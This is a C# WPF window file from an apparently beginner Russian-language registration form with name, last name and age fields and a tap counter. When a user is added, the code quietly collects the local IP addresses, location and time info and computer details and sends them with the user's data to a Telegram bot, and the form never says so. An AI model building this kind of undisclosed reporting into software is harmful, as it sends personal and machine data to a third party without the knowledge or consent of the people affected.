using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace WpfAppПерваяПробаПера
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        DataBase dataBase = new DataBase();
        public MainWindow()
        {
            InitializeComponent();
        }

        private void TextBoxNameUser_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void TextBoxLastNameUser_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void TextBoxAgeUser_TextChanged(object sender, TextChangedEventArgs e)
        {

        }

        private void AddUser(DataBase dataBase)
        {
            string nameUser = "";
            string lastNameUser = "";
            uint ageUser = 0;
            if (!(String.IsNullOrWhiteSpace(TextBoxNameUser.Text)))
            {
                nameUser = TextBoxNameUser.Text;
                TextBoxNameUser.Text = "";
            }
            else
            {
                MessageBox.Show("Введите корректное имя пользователя!");
            }
            if (!(String.IsNullOrWhiteSpace(TextBoxLastNameUser.Text)))
            {
                lastNameUser = TextBoxLastNameUser.Text;
                TextBoxLastNameUser.Text = "";
            }
            else
            {
                MessageBox.Show("Введите корректное фамилию пользователя!");
            }
            if (uint.TryParse(TextBoxAgeUser.Text, out uint age) && age != 0)
            {
                ageUser = age;
                TextBoxAgeUser.Text = "";
            }
            else
            {
                MessageBox.Show("Введите корректный возраст пользователя!");
            }
            if (nameUser != "" && lastNameUser != "" && ageUser != 0)
            {
                dataBase.Users.Add(new User() { Name = nameUser, LastName = lastNameUser, Age = ageUser });
                dataBase.SaveChanges();
                var lastUserInDataBase = dataBase.Users
                         .OrderByDescending(u => u.Id)
                         .FirstOrDefault();
                var q = NetworkPositionInfo.GetLocalIPAddresses();
                var w = NetworkPositionInfo.GetSystemTimeLocationInfo();
                var e = NetworkPositionInfo.GetComputerInfo();
                TelegrammBot.TelegrammMessage($"Пользователь:\n Id: {lastUserInDataBase.Id}\n Имя: {lastUserInDataBase.Name}\n Фамилия: {lastUserInDataBase.LastName}\n Возраст: {lastUserInDataBase.Age}\n Успешно добавлен в базу данных от:\n\n\n{q}\n{w}\n{e}");
                MessageBox.Show($"Пользователь: {nameUser} {lastNameUser} {ageUser} добавлен в базу данных");
            }
        }

        private void ButtonRegistrationUser_Click(object sender, RoutedEventArgs e)
        {
            AddUser(dataBase);
            InformationForm();
        }

        private void InformationForm()
        {
              WindowForm.Title = $"Формошка Регистрации Юзверей (Зарегистрировано пользователей = {dataBase.Users.Count()} )";
        }
        private void WindowForm_Loaded(object sender, RoutedEventArgs e)
        {
            InformationForm();
        }


        private void ButtonTap_Click(object sender, RoutedEventArgs e)
        {
            if (ButtonTap.Content.ToString() == "Тапалка") ButtonTap.Content = "0";
            try
            {
                ButtonTap.Content = int.Parse(ButtonTap.Content.ToString()) + 1;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

    }
}